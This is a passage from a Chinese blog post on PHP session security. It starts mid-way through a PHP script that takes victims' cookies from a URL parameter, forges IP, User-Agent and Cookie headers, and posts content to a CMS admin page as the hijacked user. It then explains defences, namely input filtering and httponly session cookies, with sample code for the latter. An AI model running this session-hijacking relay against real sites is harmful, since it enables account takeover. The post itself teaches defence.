+			<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+			<span class="token keyword">break</span><span class="token punctuation">;</span>
+	   <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token keyword">return</span> <span class="token variable">$ip</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
+<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getRealIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$cookies</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cook'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+<span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+	<span class="token string single-quoted-string">'User-Agent:'</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'X-FORWARDED-FOR:'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'Remote-Addr:'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'Cookie:'</span><span class="token operator">.</span><span class="token variable">$cookies</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"http://mycms.whyun.com/back/article/article_add.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HTTPHEADER</span><span class="token punctuation">,</span> <span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//构造IP</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_REFERER</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//构造来路</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'title'</span><span class="token operator">=></span><span class="token string single-quoted-string">'这是跨站攻击测试'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'content'</span><span class="token operator">=></span><span class="token string single-quoted-string">'网站被跨站攻击了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"var data = <span class="token interpolation"><span class="token variable">$out</span></span>;"</span><span class="token punctuation">;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>代码2.5 伪造session提交</strong></p>
+<p>从代码2.5中可以看出，我们伪造了http请求的header内容，吧浏览器中mycms域的cookie原封不动传过去了，同时在header还伪造了user-agent和ip，mycms中在校验session的时候，发现sessionid和user-agent信息都是对的，所以认为session是存在且合法的！至此为止，我们完成了跨站请求攻击。</p>
+<h2 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a>3.防范</h2><p>第二章节中，我们的攻击思路是这样的，我们示例了通过js获取cookie，然后生成一个第三方网站的网络请求，然后再从第三方网站发起一个网络请求到我们自己的网站上。整个更急流程大体是这样的：<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/hack_process.png" alt="跨站请求流程"><br><strong>图3.1 跨站请求流程</strong></p>
+<p>从图3.1可以看出，让整个流程无法进行下去的措施有两个，一个就是加强对提交信息和页面显示信息的过滤，让非法提交内容无处施展；第二个就是让存储在cookie中的sessionid不能被js读取到，这样即使第一步出现漏洞的情况下，依然不会被攻击者走完整个攻击流程。<br>在php中设置sessionid的httponly属性的方法有很多，具体可以参考 stackoverflow上的一个<a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/36877/how-do-you-set-up-use-httponly-cookies-in-php">提问</a>。jsp中也是有很多方法，可以参考开源中国红薯发表的一篇<a target="_blank" rel="noopener" href="http://www.oschina.net/question/12_72706">文章</a>。这里仅仅贴出来php中一个解决方法，就是在<code>session_start()</code>之后重新设置一下cookie:    </p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$sess_name</span> <span class="token operator">=</span> <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//必须在session_start之前调用session_name</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token variable">$sess_name</span><span class="token punctuation">,</span> <span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>代码3.1 设置httponly属性为true</strong></p>
+<p>本文源代码地址：<a target="_blank" rel="noopener" href="http://git.oschina.net/yunnysunny/hack">源码git库</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>yunnysunny
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://blog.whyun.com/posts/session/" title="session的安全性">https://blog.whyun.com/posts/session/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://www.zhihu.com/people/yunnysunny">
+          <span class="icon">
+            <i class="fab fa-zhihu"></i>
+          </span>
+
+          <span class="label">知乎</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/socket/" rel="prev" title="小议socket关闭">
+                  <i class="fa fa-chevron-left"></i> 小议socket关闭
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/node/" rel="next" title="node中调试子进程">
+                  node中调试子进程 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  
+  <div class="comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="yunnysunny/yunnysunny.github.io" 
+        data-repo-id="MDEwOlJlcG9zaXRvcnkyMDU4ODk4Ng==" 
+        data-category="Show and tell"
+        data-category-id="DIC_kwDOATopus4B_4of"
+        data-mapping="pathname" 
+        data-reactions-enabled="1" 
+        data-emit-metadata="1" 
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+  </div>
+  
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yunnysunny</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+  <div class="addthis_inline_share_toolbox">
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-614ace0bda715cc7" async="async"></script>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
